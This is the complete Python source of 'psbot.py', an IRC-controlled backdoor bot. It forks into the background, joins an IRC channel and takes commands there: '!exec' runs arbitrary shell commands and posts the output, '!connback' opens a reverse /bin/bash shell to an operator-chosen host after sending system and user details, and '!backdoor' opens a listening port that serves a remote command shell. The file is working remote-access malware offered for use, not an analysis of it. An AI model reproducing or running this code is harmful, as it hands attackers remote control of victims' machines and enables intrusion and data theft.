#!/usr/bin/env python

import sys
from socket import *
import string
import os
import time
import popen2
import signal

def daemonize():
	pid = os.fork()
	if(pid != 0):
		os._exit(0)

def main():
	if len(sys.argv) < 5:
		print "Usage:",sys.argv[0]," <host> <port> <nick> <channel> (password)"
		sys.exit(1)

	HOST = sys.argv[1]
	PORT = int(sys.argv[2])
	NICK = sys.argv[3]
	CHAN = sys.argv[4]
	PASS = ""

	if len(sys.argv) == 6:
		PASS = sys.argv[5]
		print "[+] Connecting to %s@%s:%s (chan:%s pass:%s)" % (NICK, HOST, PORT, CHAN, PASS)
	else:
		print "[+] Connecting to %s@%s:%s (chan:%s)" % ( NICK, HOST, PORT, CHAN )

	print "[+] Done.."

	readbuffer = ""

	s = socket( )

	try:
		s.connect((HOST, PORT))
	except:
		print "[-] Couldn't connect to %s:%s" % (HOST, PORT)
		sys.exit(1)

	s.send("NICK %s\r\n" % NICK)
	s.send("USER %s %s bla :%s\r\n" % (NICK , NICK, NICK))

	if len(PASS) != 0:
		s.send("JOIN %s %s\r\n" % (CHAN, PASS))
	else:
		s.send("JOIN %s\r\n" % (CHAN))

	while 1:
		readbuffer=readbuffer+s.recv(1024)
		temp=string.split(readbuffer, "\n")
		readbuffer=temp.pop()
		for line in temp:
			line=string.rstrip(line)
			line=string.split(line)
			try:
				if line[1] == "JOIN":
					name = str(line[0].split("!")[0])
					s.send("PRIVMSG %s :%s%s%s\r\n" % (CHAN, "Welcome ", name.replace(":","") , "!!"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|------------------------------|"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "| qnix[at]0x80[dot]org |"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|       psbot.py v0.1        |"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|    type !help for help  |"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|------------------------------|"))
				if line[3] == ":!help":
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Displaying list of commands the bot understands"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !exec     <command>      - execute command"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !connback <host> <port>  - connback backdoor"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !backdoor <port>         - backdoor"))
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !die    - die!!"))
				if line[3] == ":!exec":
					temp = []
					temp2 = []
					for lines in line:
						temp.append(lines)
						if len(temp) > 4:
							temp2.append(lines)
					command = ' '.join(temp2)
					s.send("PRIVMSG %s :%s%s%s\r\n" % (CHAN, "[+] Executing \"", command, "\""))
					for line in os.popen(command).readlines():
						s.send("PRIVMSG %s :%s\r\n" % (CHAN, line))
				if line[3] == ":!connback":
					if line[4] != "":
						if line[5] != "":
							host	= line[4]
							try:
								port	= int(line[5])
							except:
								s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[-] invalid port number"))
								break
							shell	= "/bin/bash"
							s.send("PRIVMSG %s :%s%s:%s\r\n" % (CHAN, "[+] Connback to ", host, port))
							s2 = socket(AF_INET, SOCK_STREAM)
							try:
								s2.connect((socket.gethostbyname(host), port))
								s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Done"))
								s2.send("########################################################\n")
								s2.send("############## Psbot Connect-back Backdoor #############\n")
								s2.send("########################################################\n\n")
								s2.send("UID: %s GID: %s\n" % (os.getuid(),os.getgid()))
								s2.send("Process ID: %s\n" % (os.getpid()))
								s2.send("Current Directory: %s\n" % (os.getcwd()))
								for info in os.uname():
									s2.send("System information: %s" % (info))
								s2.send("\nTime: %s\n\n" % (time.ctime(time.time())))
							except:
								s.send("PRIVMSG %s :%s%s:%s\r\n" % (CHAN, "[-] Couldn't connect to ", host, port))
							os.dup2(s2.fileno(), 0)
							os.dup2(s2.fileno(), 1)
							os.dup2(s2.fileno(), 2)
							os.system(shell)
				if line[3] == ":!backdoor":

					try:
						port = int(line[4])
					except:
						s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[-] Invalid port"))
						break

					s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Backdoor on port ", port))

					try:
						s3 = socket(AF_INET,SOCK_STREAM)
						s3.bind(('', port))
						s3.listen(5)
						s.send("PRIVMSG %s: %s\r\n" % (CHAN, "[+] Done!!"))
					except:
						s.send("PRIVMSG %s: %s%s\r\n" % (CHAN, "[-] Failed SockError: ", sys.exc_value))
						break

					if os.fork()==0:
						while 1:
							connection,addreess=s3.accept()
							data=connection.recv(1024)
							if os.fork()==0:
								while 1:
									data=connection.recv(1024)
									if not data:break
									cmd_res,stdin,stderror=popen2.popen3(data[:-1])
									result=cmd_res.read()
									error=stderror.read()
									if error:
										connection.send(error)
									for i in range(len(data.split())-1):
										if 'cd' in data.split()[i]:
											try:
												os.chdir(data.split()[i+1].split(';')[0])
											except:
												error="[-] Error"+str(sys.exc_value)+"\n"
												connection.send(error)
									username=os.popen("whoami").read()
									adr=os.popen("uname -n").read()
									if username[:-1]=='root':
										simvol="# "
									else:
										simvol="> "
									path=os.getcwd()
									promt='['+username[:-1]+'@'+adr[:-1]+' '+path+']'+simvol
									answer=result+promt
									connection.send(answer)
				if line[3] == ":!die":
					s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Killing me.."))
					myproc = popen2.Popen3("")
					pgid = os.getpgid(myproc.pid)
					os.killpg(pgid, signal.SIGKILL)
			except(IndexError):
				pass
	
			if(line[0]=="PING"):
				s.send("PONG %s\r\n" % line[1])

if __name__ == "__main__":
	daemonize()
	main()
